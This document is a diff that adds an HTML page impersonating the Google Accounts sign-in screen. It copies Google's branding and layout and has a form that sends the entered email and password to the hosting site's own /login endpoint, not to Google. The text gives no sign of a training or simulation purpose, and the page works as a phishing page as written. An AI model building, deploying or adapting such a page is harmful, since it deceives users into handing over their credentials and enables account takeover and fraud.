@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; margin: 0; color: #202124 }
+        .card { max-width: 400px; margin: 6vh auto; border: 1px solid #dadce0; border-radius: 8px; padding: 40px }
+        .logo { font-size: 26px; text-align: center; margin-bottom: 12px }
+        h1 { font-size: 22px; font-weight: 400; text-align: center; margin: 8px 0 }
+        p { text-align: center; color: #5f6368; font-size: 15px; margin: 0 0 26px }
+        input { width: 100%; box-sizing: border-box; padding: 13px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 15px }
+        button { float: right; margin-top: 18px; padding: 10px 22px; border: 0; border-radius: 4px; background: #1a73e8; color: #fff; font-size: 14px; font-weight: 600 }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Google</div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <form method="POST" action="/login">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+</body>
+</html>
